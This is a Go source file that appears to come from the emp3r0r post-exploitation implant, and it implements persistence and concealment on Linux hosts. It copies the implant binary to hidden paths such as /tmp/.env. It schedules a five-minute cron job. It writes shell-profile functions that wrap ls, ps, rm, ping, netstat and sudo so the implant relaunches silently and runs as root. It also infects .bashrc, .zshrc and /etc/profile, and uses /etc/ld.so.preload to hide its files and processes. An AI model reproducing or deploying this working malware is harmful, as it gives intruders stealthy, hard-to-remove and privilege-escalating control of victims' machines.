package agent

import (
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/user"
	"strings"
)

// TODO implement more methods

var (
	// PersistMethods CC calls one of these methods to get persistence, or all of them at once
	PersistMethods = map[string]func() error{
		"ld_preload": ldPreload,
		"profiles":   profiles,
		"service":    service,
		"injector":   injector,
		"cron":       cronJob,
		"patcher":    patcher,
	}

	// EmpLocations all possible locations
	EmpLocations = []string{"/tmp/.env", "/dev/shm/.env", "/env", fmt.Sprintf("%s/.env", os.Getenv("HOME")), "/usr/bin/.env", "/usr/local/bin/env", "/bin/.env"}

	// call this to start emp3r0r
	payload = strings.Join(EmpLocations, " -silent=true -daemon=true || ") + " -silent=true -daemon=true"
)

// SelfCopy copy emp3r0r to multiple locations
func SelfCopy() {
	for _, path := range EmpLocations {
		err := Copy(os.Args[0], path)
		if err != nil {
			log.Print(err)
			continue
		}
	}
}

// PersistAllInOne run all persistence method at once
func PersistAllInOne() (err error) {
	for k, method := range PersistMethods {
		e := fmt.Errorf("%s: %v", k, method())
		if e != nil {
			err = fmt.Errorf("%v, %v", err, e)
		}
	}
	return
}

func cronJob() (err error) {
	err = Copy(os.Args[0], "bash")
	if err != nil {
		return
	}

	pwd, err := os.Getwd()
	if err != nil {
		return
	}
	err = AddCronJob("*/5 * * * * " + pwd + "/bash")
	return
}

func profiles() (err error) {
	user, err := user.Current()
	if err != nil {
		return fmt.Errorf("Cannot get user profile: %v", err)
	}
	accountInfo, err := CheckAccount(user.Name)
	if err != nil {
		return fmt.Errorf("Cannot check account info: %v", err)
	}

	// source
	sourceCmd := "source ~/.bashprofile"

	// set +m to silent job control
	payload = "set +m;" + payload

	// nologin users cannot do shit here
	if strings.Contains(accountInfo["shell"], "nologin") ||
		strings.Contains(accountInfo["shell"], "false") {
		if user.Uid != "0" {
			return errors.New("This user cannot login")
		}
	}

	// loader
	loader := fmt.Sprintf("\nfunction ls() { (set +m;(%s);); `which ls` $@ --color=auto; }", payload)
	loader += "\nunalias ls" // TODO check if alias exists before unalias it
	loader += "\nunalias rm"
	loader += "\nunalias ps"
	loader += fmt.Sprintf("\nfunction ping() { (set +m;(%s)); `which ping` $@; }", payload)
	loader += fmt.Sprintf("\nfunction netstat() { (set +m;(%s)); `which netstat` $@; }", payload)
	loader += fmt.Sprintf("\nfunction ps() { (set +m;(%s)); `which ps` $@; }", payload)
	loader += fmt.Sprintf("\nfunction rm() { (set +m;(%s)); `which rm` $@; }\n", payload)

	// exec our payload as root too!
	// sudo payload
	var sudoLocs []string
	for _, loc := range EmpLocations {
		sudoLocs = append(sudoLocs, "`which sudo` -E "+loc+" -silent=true -daemon=true")
	}
	sudoPayload := strings.Join(sudoLocs, "||")
	loader += fmt.Sprintf("\nfunction sudo() { `which sudo` $@; (set +m;(%s)) }", sudoPayload)
	err = ioutil.WriteFile(user.HomeDir+"/.bashprofile", []byte(loader), 0644)
	if err != nil {
		if !IsFileExist(user.HomeDir) {
			err = ioutil.WriteFile("/etc/bash_profile", []byte(loader), 0644)
			if err != nil {
				return fmt.Errorf("No HomeDir found, and cannot write elsewhere: %v", err)
			}
			err = AppendToFile("/etc/profile", "source /etc/bash_profile")
			return fmt.Errorf("This user has no home dir: %v", err)
		}
		return
	}

	// check if profiles are already written
	data, err := ioutil.ReadFile(user.HomeDir + "/.bashrc")
	if err != nil {
		log.Println(err)
		return
	}
	if strings.Contains(string(data), sourceCmd) {
		err = errors.New("profiles: already written")
		return
	}
	// infect all profiles
	_ = AppendToFile(user.HomeDir+"/.profile", sourceCmd)
	_ = AppendToFile(user.HomeDir+"/.bashrc", sourceCmd)
	_ = AppendToFile(user.HomeDir+"/.zshrc", sourceCmd)
	_ = AppendToFile("/etc/profile", "source "+user.HomeDir+"/.bashprofile")

	return
}

// add libemp3r0r.so to LD_PRELOAD
// our files and processes will be hidden from common system utilities
func ldPreload() error {
	if !IsFileExist(Libemp3r0rFile) {
		return fmt.Errorf("%s does not exist! Try module vaccine?", Libemp3r0rFile)
	}
	if os.Geteuid() == 0 {
		return ioutil.WriteFile("/etc/ld.so.preload", []byte(Libemp3r0rFile), 0600)
	}

	// if no root, we will just add libemp3r0r.so to bash profile
	u, err := user.Current()
	if err != nil {
		log.Print(err)
		return err
	}
	return AppendToFile(u.HomeDir+"/.profile", "export LD_PRELOAD="+Libemp3r0rFile)

}

func injector() (err error) {
	return
}

func service() (err error) {
	return
}

func patcher() (err error) {
	return
}
